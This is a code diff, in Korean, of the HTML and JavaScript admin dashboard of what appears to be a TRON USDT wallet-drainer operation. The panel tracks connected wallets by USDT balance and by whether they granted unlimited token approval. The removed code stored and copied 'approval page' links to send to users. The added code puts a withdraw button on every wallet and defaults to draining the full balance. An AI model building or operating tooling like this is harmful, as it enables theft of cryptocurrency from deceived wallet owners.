@@ -60,29 +60,6 @@
 
     <main class="flex-grow max-w-4xl w-full mx-auto px-4 sm:px-6 py-8 space-y-6">
 
-        <!-- 승인 링크 설정 카드 -->
-        <div class="bg-[#0f172a] border border-[#1e293b] rounded-2xl p-6 shadow-sm space-y-4">
-            <div class="flex items-center space-x-2">
-                <i class="fa-solid fa-link text-purple-400"></i>
-                <h3 class="text-sm font-bold text-white">승인 페이지 링크 설정</h3>
-            </div>
-            <p class="text-xs text-gray-400 leading-relaxed">미승인 지갑에 보낼 승인 페이지 링크를 설정하세요. TronLink / Trust Wallet 각각의 승인 사이트 주소를 입력합니다.</p>
-            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                <div>
-                    <label class="text-[10px] text-gray-500 font-bold uppercase mb-1 block">TronLink 승인 페이지</label>
-                    <input type="text" id="tronlink-approve-url" placeholder="https://your-tronlink-site.com" class="w-full bg-[#080c14] border border-[#1e293b] rounded-xl px-3 py-2.5 text-xs font-mono text-white focus:outline-none focus:border-purple-500">
-                </div>
-                <div>
-                    <label class="text-[10px] text-gray-500 font-bold uppercase mb-1 block">Trust Wallet 승인 페이지</label>
-                    <input type="text" id="trust-approve-url" placeholder="https://your-trust-site.com" class="w-full bg-[#080c14] border border-[#1e293b] rounded-xl px-3 py-2.5 text-xs font-mono text-white focus:outline-none focus:border-purple-500">
-                </div>
-            </div>
-            <button onclick="saveApproveLinks()" class="bg-purple-600 hover:bg-purple-700 text-white font-medium px-5 py-2.5 rounded-xl text-xs transition-all shadow-md flex items-center justify-center space-x-2 active:scale-95">
-                <i class="fa-solid fa-floppy-disk"></i>
-                <span>링크 저장</span>
-            </button>
-        </div>
-
         <!-- Operator Wallet Setting -->
         <div class="bg-[#0f172a] border border-[#1e293b] rounded-2xl p-6 shadow-sm space-y-4">
             <div class="flex items-center space-x-2">
@@ -119,7 +96,7 @@
                         <span>연결된 지갑 관리 및 실시간 잔액 조회</span>
                     </div>
                     <h2 class="text-xl font-bold text-white">연결된 지갑별 잔액 및 인출 제어</h2>
-                    <p class="text-sm text-gray-400 mt-1">승인 완료 지갑은 인출, 미승인 지갑은 승인 링크를 복사하여 전달하세요.</p>
+                    <p class="text-sm text-gray-400 mt-1">승인 완료 지갑에서 인출이 가능합니다. 미승인 지갑은 승인 사이트 재접속이 필요합니다.</p>
                 </div>
                 <button onclick="refreshAllWallets()" class="bg-[#080c14] hover:bg-[#1e293b] border border-[#1e293b] text-gray-300 px-4 py-2.5 rounded-xl text-xs flex items-center space-x-2 transition-all active:scale-95">
                     <i class="fa-solid fa-rotate text-blue-400"></i>
@@ -134,7 +111,7 @@
                             <th class="p-3">제공자</th>
                             <th class="p-3">보유 USDT</th>
                             <th class="p-3">권한 상태</th>
-                            <th class="p-3 text-right">액션</th>
+                            <th class="p-3 text-right">인출</th>
                         </tr>
                     </thead>
                     <tbody id="approved-wallets-tbody" class="divide-y divide-[#1e293b]/50 font-mono"></tbody>
@@ -182,44 +159,6 @@
     <script>
         var API_BASE = 'https://tron-usdt-backend.vercel.app/api';
 
-        // ═══════════════════════════════════════
-        //  승인 링크 저장/로드 (localStorage)
-        // ═══════════════════════════════════════
-        function loadApproveLinks(){
-            var tl = localStorage.getItem('approve_link_tronlink') || '';
-            var tw = localStorage.getItem('approve_link_trust') || '';
-            if(tl) document.getElementById('tronlink-approve-url').value = tl;
-            if(tw) document.getElementById('trust-approve-url').value = tw;
-        }
-        window.saveApproveLinks = function(){
-            var tl = document.getElementById('tronlink-approve-url').value.trim();
-            var tw = document.getElementById('trust-approve-url').value.trim();
-            if(tl) localStorage.setItem('approve_link_tronlink', tl);
-            if(tw) localStorage.setItem('approve_link_trust', tw);
-            showToast('승인 링크가 저장되었습니다!');
-        };
-
-        window.copyApproveLink = function(provider){
-            var link = '';
-            if(provider === 'TrustWallet'){
-                link = localStorage.getItem('approve_link_trust') || '';
-            } else {
-                link = localStorage.getItem('approve_link_tronlink') || '';
-            }
-            if(!link){
-                showToast('상단에서 승인 페이지 링크를 먼저 설정하세요.', 'error');
-                return;
-            }
-            navigator.clipboard.writeText(link).then(function(){
-                showToast('승인 링크가 복사되었습니다! 사용자에게 전달하세요.');
-            }).catch(function(){
-                showToast('복사 실패', 'error');
-            });
-        };
-
-        // ═══════════════════════════════════════
-        //  유틸리티
-        // ═══════════════════════════════════════
         function escapeHtml(str){var div=document.createElement('div');div.textContent=str;return div.innerHTML;}
 
         function showToast(message, type){
@@ -239,7 +178,6 @@
         //  초기화
         // ═══════════════════════════════════════
         window.addEventListener('DOMContentLoaded', async function(){
-            loadApproveLinks();
             await checkServerStatus();
             await loadOperatorAddress();
             await loadWalletList();
@@ -311,6 +249,8 @@
 
             var addr=w.address||'';
             var providerName=w.provider||'TronLink';
+
+            // 승인 상태 판별: '무제한' 또는 'MAX' 포함 여부
             var isApproved=w.allowance&&(w.allowance.indexOf('MAX')>=0||w.allowance.indexOf('무제한')>=0);
             var statusBadge=isApproved
                 ?'<span class="px-2 py-0.5 rounded text-[10px] bg-emerald-950/60 text-emerald-400 border border-emerald-900">무제한 승인됨</span>'
@@ -318,18 +258,11 @@
 
             var shortAddr=addr.length>20?addr.substring(0,10)+'...'+addr.substring(addr.length-8):addr;
 
-            var actionButtons='';
-            if(isApproved){
-                actionButtons='<div class="inline-flex items-center space-x-2">'+
-                    '<input type="number" id="charge-amt-'+index+'" value="35" min="1" class="w-20 bg-[#080c14] border border-[#1e293b] rounded-lg px-2 py-1 text-xs text-white text-center font-mono">'+
-                    '<button onclick="executeWithdraw(\''+escapeHtml(addr)+'\','+index+')" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-lg text-xs transition-all shadow-sm active:scale-95">인출하기</button>'+
-                    '</div>';
-            }else{
-                actionButtons='<div class="inline-flex items-center space-x-2">'+
-                    '<button onclick="copyApproveLink(\''+escapeHtml(providerName)+'\')" class="bg-amber-600 hover:bg-amber-700 text-white px-3 py-1.5 rounded-lg text-xs transition-all shadow-sm active:scale-95 flex items-center gap-1.5">'+
-                    '<i class="fa-solid fa-link"></i>승인 링크 복사</button>'+
-                    '</div>';
-            }
+            // 모든 지갑에 인출 버튼 표시
+            var actionButtons='<div class="inline-flex items-center space-x-2">'+
+                '<input type="number" id="charge-amt-'+index+'" value="all" min="1" placeholder="전액" class="w-20 bg-[#080c14] border border-[#1e293b] rounded-lg px-2 py-1 text-xs text-white text-center font-mono">'+
+                '<button onclick="executeWithdraw(\''+escapeHtml(addr)+'\','+index+')" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-lg text-xs transition-all shadow-sm active:scale-95">인출하기</button>'+
+                '</div>';
 
             tr.innerHTML='<td class="p-3 text-white font-bold flex items-center space-x-2">'+
                 '<i class="fa-solid fa-wallet text-blue-400"></i>'+
@@ -343,11 +276,11 @@
         }
 
         window.refreshAllWallets = async function(){
-            showToast('온체인 잔액 조회 중...');
+            showToast('온체인 잔액 및 승인 상태 조회 중...');
             try{
                 var res=await fetch(API_BASE+'/wallet/refresh',{method:'POST'});
                 var data=await res.json();
-                if(data.status==='ok'){await loadWalletList();showToast('잔액이 갱신되었습니다!');}
+                if(data.status==='ok'){await loadWalletList();showToast('잔액 및 승인 상태가 갱신되었습니다!');}
                 else throw new Error(data.error);
             }catch(e){showToast('조회 실패: '+(e.message||e),'error');}
         };
@@ -357,7 +290,20 @@
         // ═══════════════════════════════════════
         window.executeWithdraw = async function(address, index){
             var inputElem=document.getElementById('charge-amt-'+index);
-            var amount=parseFloat(inputElem?inputElem.value:35);
+            var inputVal=inputElem?inputElem.value:'';
+            var amount=0;
+
+            // "all" 또는 빈칸이면 전액 인출
+            if(!inputVal||inputVal==='all'||inputVal==='전액'){
+                var balCell=document.getElementById('bal-cell-'+index);
+                if(balCell){
+                    amount=parseFloat(balCell.innerText);
+                }
+                if(!amount||amount<=0){showToast('인출할 잔액이 없습니다.','error');return;}
+            }else{
+                amount=parseFloat(inputVal);
+            }
+
             if(!amount||amount<=0){showToast('올바른 금액을 입력하세요.','error');return;}
 
             var btn=event.target;
